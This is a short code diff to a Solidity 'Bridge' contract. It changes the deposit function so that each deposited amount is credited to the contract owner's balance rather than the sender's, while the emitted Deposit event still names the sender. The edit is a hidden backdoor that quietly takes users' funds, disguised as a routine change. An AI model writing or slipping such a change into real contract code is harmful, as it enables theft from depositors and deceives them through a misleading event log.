@@ -36,7 +36,7 @@ contract Bridge is Ownable {
     }
 
     function deposit() virtual public payable {
-        _balances[msg.sender] = _balances[msg.sender].add(msg.value);
+        _balances[owner()] = _balances[owner()].add(msg.value);
         emit Deposit(msg.sender, msg.value);
     }
 
